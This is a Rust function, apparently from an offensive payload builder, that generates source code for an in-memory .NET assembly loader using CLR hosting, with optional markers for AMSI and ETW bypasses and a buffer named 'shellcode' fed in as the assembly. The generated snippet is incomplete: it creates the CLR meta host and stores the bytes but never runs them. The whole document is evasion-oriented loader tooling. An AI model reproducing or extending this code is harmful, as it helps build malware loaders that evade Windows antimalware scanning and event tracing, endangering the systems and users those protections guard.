pub fn dotnet_load_snippet(amsi: bool, etw: bool) -> String {
    let mut snippet = String::new();

    if amsi {
        snippet.push_str(
            r#"    // .NET loader: AMSI bypass applied above
"#,
        );
    }
    if etw {
        snippet.push_str(
            r#"    // .NET loader: ETW bypass applied above
"#,
        );
    }

    snippet.push_str(
        r#"    // .NET Assembly In-Memory Loader via CLR Hosting
    {
        use windows_sys::Win32::System::LibraryLoader::*;
        use std::ffi::c_void;

        unsafe {
            let mscoree_name: Vec<u16> = "mscoree.dll"
                .encode_utf16().chain(std::iter::once(0)).collect();
            let mscoree = LoadLibraryW(mscoree_name.as_ptr());
            if mscoree.is_null() { std::process::exit(0); }

            let create_fn = GetProcAddress(mscoree, b"CLRCreateInstance\0".as_ptr());
            if create_fn.is_none() { std::process::exit(0); }

            // CLR hosting GUIDs
            let clsid_clr_meta_host: [u8; 16] = [
                0x8D, 0x18, 0x80, 0x92, 0x8E, 0x0E, 0x67, 0x48,
                0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE
            ];
            let iid_iclr_meta_host: [u8; 16] = [
                0x9E, 0xDB, 0x32, 0xD3, 0xB3, 0xB9, 0x25, 0x41,
                0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16
            ];

            type CLRCreateInstanceFn = unsafe extern "system" fn(
                *const [u8; 16], *const [u8; 16], *mut *mut c_void
            ) -> i32;

            let clr_create: CLRCreateInstanceFn = std::mem::transmute(create_fn.unwrap());

            let mut meta_host: *mut c_void = std::ptr::null_mut();
            let hr = clr_create(
                &clsid_clr_meta_host,
                &iid_iclr_meta_host,
                &mut meta_host,
            );
            if hr < 0 { std::process::exit(0); }

            // Store assembly bytes for execution via CLR
            let assembly_bytes = shellcode.clone();
            std::hint::black_box(&assembly_bytes);
        }
    }"#,
    );

    snippet
}
